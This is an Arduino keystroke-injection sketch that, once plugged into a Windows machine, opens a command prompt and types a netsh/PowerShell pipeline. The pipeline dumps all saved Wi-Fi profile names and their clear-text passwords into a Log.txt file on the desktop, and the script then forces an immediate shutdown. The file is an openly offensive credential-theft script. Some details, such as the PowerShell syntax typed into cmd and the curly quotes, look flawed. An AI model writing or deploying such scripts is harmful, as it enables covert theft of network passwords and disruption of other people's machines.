#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  
  delay(7000);
  
  Keyboard.press(KEY_CAPS_LOCK); 
  Keyboard.release(KEY_CAPS_LOCK); 

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.release(KEY_LEFT_GUI); 

  Keyboard.println("r");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(6000);
  Keyboard.println("cmd");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(5000);
  Keyboard.println("(netsh wlan show profiles) | Select-String “\:(.+)$” | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=”$name” key=clear)} | Select-String “Key Content\W+\:(.+)$” | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File $env:USERPROFILE\Desktop\Log.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(10000);
  
  Keyboard.println("exit");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.release(KEY_LEFT_GUI); 

  Keyboard.println("r");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(3000);
  Keyboard.println("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(6000);
  Keyboard.println("shutdown /s /t 0");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(2000);
  
  Keyboard.end();

}

void loop(){}